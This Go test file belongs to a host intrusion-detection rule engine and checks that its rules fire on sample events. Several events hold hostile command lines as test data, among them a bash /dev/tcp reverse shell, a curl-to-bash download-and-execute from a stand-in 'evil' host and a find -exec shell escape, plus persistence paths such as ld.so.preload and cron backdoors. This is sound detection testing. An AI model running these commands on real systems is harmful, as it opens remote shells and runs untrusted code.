package detect

import (
	"testing"

	"github.com/sentinel/server/internal/model"
)

func loadEngine(t *testing.T) *Engine {
	t.Helper()
	e := New()
	n, err := e.LoadDir("../../rules")
	if err != nil {
		t.Fatalf("load rules: %v", err)
	}
	if n == 0 {
		t.Fatalf("no rules loaded")
	}
	return e
}

func firedIDs(dets []*model.Detection) map[string]bool {
	m := map[string]bool{}
	for _, d := range dets {
		m[d.RuleID] = true
	}
	return m
}

func TestReverseShellDetected(t *testing.T) {
	e := loadEngine(t)
	ev := &model.Event{
		Category: model.CatProcess, Action: "exec",
		Process: &model.Process{Name: "bash", Cmdline: "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"},
	}
	got := firedIDs(e.Eval(ev))
	if !got["proc-reverse-shell"] {
		t.Fatalf("expected proc-reverse-shell to fire, got %v", got)
	}
}

func TestDownloadExecDetected(t *testing.T) {
	e := loadEngine(t)
	ev := &model.Event{
		Category: model.CatProcess, Action: "exec",
		Process: &model.Process{Name: "bash", Cmdline: "curl http://evil/x.sh | bash"},
	}
	if !firedIDs(e.Eval(ev))["proc-download-exec"] {
		t.Fatalf("expected proc-download-exec to fire")
	}
}

func TestGtfobinsDetected(t *testing.T) {
	e := loadEngine(t)
	ev := &model.Event{
		Category: model.CatProcess, Action: "exec",
		Process: &model.Process{Name: "find", Cmdline: "find . -exec /bin/sh -p \\; -quit"},
	}
	if !firedIDs(e.Eval(ev))["proc-gtfobins"] {
		t.Fatalf("expected proc-gtfobins to fire")
	}
}

func TestFilelessExecDetected(t *testing.T) {
	e := loadEngine(t)
	ev := &model.Event{
		Category: model.CatProcess, Action: "exec",
		Process: &model.Process{Name: "x", Exe: "/memfd:payload (deleted)"},
	}
	if !firedIDs(e.Eval(ev))["proc-fileless-exec"] {
		t.Fatalf("expected proc-fileless-exec to fire")
	}
}

func TestKmodLoadDetected(t *testing.T) {
	e := loadEngine(t)
	ev := &model.Event{Category: model.CatSystem, Action: "kmod_load", Message: "kernel module loaded: evil_rk"}
	if !firedIDs(e.Eval(ev))["sys-kmod-load"] {
		t.Fatalf("expected sys-kmod-load to fire")
	}
}

func TestRemovableMountDetected(t *testing.T) {
	e := loadEngine(t)
	ev := &model.Event{Category: model.CatUSB, Action: "mount", USB: &model.USBInfo{Action: "mount", Mount: "/media/usb0"}}
	if !firedIDs(e.Eval(ev))["usb-removable-mount"] {
		t.Fatalf("expected usb-removable-mount to fire")
	}
}

func TestPreloadPersistenceDetected(t *testing.T) {
	e := loadEngine(t)
	write := &model.Event{
		Category: model.CatFile, Action: "write",
		File: &model.FileInfo{Path: "/etc/ld.so.preload", Op: "write"},
	}
	if !firedIDs(e.Eval(write))["file-preload-persistence"] {
		t.Fatalf("expected file-preload-persistence to fire on write")
	}
	// a plain read of the same path must NOT fire (filter excludes reads)
	read := &model.Event{
		Category: model.CatFile, Action: "read",
		File: &model.FileInfo{Path: "/etc/ld.so.preload", Op: "read"},
	}
	if firedIDs(e.Eval(read))["file-preload-persistence"] {
		t.Fatalf("read of ld.so.preload should not fire")
	}
}

func TestWebserverShellRequiresBothSelections(t *testing.T) {
	e := loadEngine(t)
	// parent nginx + child bash => fire
	ev := &model.Event{
		Category: model.CatProcess,
		Process:  &model.Process{Name: "bash", Parent: "nginx"},
	}
	if !firedIDs(e.Eval(ev))["proc-webserver-spawns-shell"] {
		t.Fatalf("expected webserver-shell to fire for nginx->bash")
	}
	// parent bash + child bash => must NOT fire
	ev2 := &model.Event{
		Category: model.CatProcess,
		Process:  &model.Process{Name: "bash", Parent: "bash"},
	}
	if firedIDs(e.Eval(ev2))["proc-webserver-spawns-shell"] {
		t.Fatalf("webserver-shell should not fire for bash->bash")
	}
}

func TestCronPersistenceDetected(t *testing.T) {
	e := loadEngine(t)
	ev := &model.Event{
		Category: model.CatFile,
		File:     &model.FileInfo{Path: "/etc/cron.d/backdoor", Op: "create"},
	}
	if !firedIDs(e.Eval(ev))["file-cron-persistence"] {
		t.Fatalf("expected file-cron-persistence to fire")
	}
}

func TestAuthorizedKeysEndswith(t *testing.T) {
	e := loadEngine(t)
	ev := &model.Event{
		Category: model.CatFile,
		File:     &model.FileInfo{Path: "/home/alice/.ssh/authorized_keys", Op: "write"},
	}
	if !firedIDs(e.Eval(ev))["file-ssh-authorized-keys"] {
		t.Fatalf("expected ssh authorized_keys rule to fire")
	}
}

func TestCloudUploadNumericGuard(t *testing.T) {
	e := loadEngine(t)
	big := &model.Event{
		Category: model.CatNetwork,
		Network:  &model.NetInfo{Category: "cloud_storage", Direction: "outbound", BytesOut: 50 * 1024 * 1024},
	}
	if !firedIDs(e.Eval(big))["net-cloud-storage-upload"] {
		t.Fatalf("expected cloud upload rule to fire for large transfer")
	}
	small := &model.Event{
		Category: model.CatNetwork,
		Network:  &model.NetInfo{Category: "cloud_storage", Direction: "outbound", BytesOut: 1024},
	}
	if firedIDs(e.Eval(small))["net-cloud-storage-upload"] {
		t.Fatalf("cloud upload rule should not fire for small transfer")
	}
}

func TestCategoryGating(t *testing.T) {
	e := loadEngine(t)
	// A network event must not trip process rules even with matching text.
	ev := &model.Event{
		Category: model.CatNetwork,
		Network:  &model.NetInfo{Domain: "example.com"},
		Process:  &model.Process{Cmdline: "bash -i >& /dev/tcp/1.2.3.4/9"},
	}
	if firedIDs(e.Eval(ev))["proc-reverse-shell"] {
		t.Fatalf("process rule should not fire on a network-category event")
	}
}

func TestConditionParser(t *testing.T) {
	cases := []struct {
		cond string
		sel  map[string]bool
		want bool
	}{
		{"a and b", map[string]bool{"a": true, "b": true}, true},
		{"a and b", map[string]bool{"a": true, "b": false}, false},
		{"a or b", map[string]bool{"a": false, "b": true}, true},
		{"a and not b", map[string]bool{"a": true, "b": false}, true},
		{"a and not b", map[string]bool{"a": true, "b": true}, false},
		{"all of sel*", map[string]bool{"sel1": true, "sel2": true}, true},
		{"all of sel*", map[string]bool{"sel1": true, "sel2": false}, false},
		{"1 of sel*", map[string]bool{"sel1": false, "sel2": true}, true},
		{"( a or b ) and c", map[string]bool{"a": false, "b": true, "c": true}, true},
	}
	for _, c := range cases {
		if got := evalCondition(c.cond, c.sel); got != c.want {
			t.Errorf("evalCondition(%q)=%v want %v", c.cond, got, c.want)
		}
	}
}
